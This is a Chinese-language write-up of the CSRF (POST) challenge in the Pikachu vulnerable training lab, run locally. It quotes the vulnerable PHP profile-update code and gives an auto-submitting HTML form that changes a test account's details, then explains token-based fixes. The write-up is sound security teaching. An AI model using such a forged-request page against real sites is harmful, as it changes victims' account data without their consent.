Pikachu - CSRF（POST）

分类：Web / CSRF · 环境：本机 Pikachu 靶场 · 题目路径：Cross-site request forgery → CSRF(post)

仅在自己部署的 127.0.0.1 靶场练习。示例只修改测试账号资料，不针对任何真实站点。

一、与 GET 题的区别

登录后访问 /pikachu/vul/csrf/csrfpost/csrf_post.php，编辑入口为 csrf_post_edit.php。该页面把资料放在 POST 请求体中，但没有增加 CSRF Token，因此“参数不在 URL 中”并不等于具备 CSRF 防护。

二、源码与成因

if(isset($_POST['submit'])){
    $getdata = escape($link, $_POST);
    $query = "update member set
        sex='{$getdata['sex']}',
        phonenum='{$getdata['phonenum']}',
        address='{$getdata['add']}',
        email='{$getdata['email']}'
        where username='{$_SESSION['csrf']['username']}'";
    execute($link, $query);
}

服务端依赖 Session 判断“当前是谁”，却没有验证“这个修改请求是否由本站页面发起”。攻击者可以在自己的页面中放置一个自动提交表单，浏览器会在同源 Cookie 策略允许时携带用户会话。

三、最小测试页面

<form action="http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"
      method="post">
  <input name="sex" value="boy">
  <input name="phonenum" value="10000000000">
  <input name="add" value="csrf-post-test">
  <input name="email" value="csrf-post@example.test">
  <input name="submit" value="submit">
</form>
<script>document.forms[0].submit()</script>

在本地靶场中，先让测试用户登录，再加载该测试页面。若返回到个人中心且资料发生变化，说明修改接口可被跨站伪造。

四、关键结论

  • POST 只改变参数传输位置，不能自动阻止跨站请求。
  • SQL 转义解决的是 SQL 注入，不是 CSRF。
  • 真正的防护应绑定当前会话和当前表单的不可预测 Token。

五、修复思路

在服务端生成 Session 绑定的随机 Token，并在表单中提交；更新前使用固定时间比较函数校验 Token。再结合 SameSite Cookie、Origin 校验和敏感操作确认，可降低跨站伪造风险。不要仅依赖隐藏字段名称或前端脚本校验。
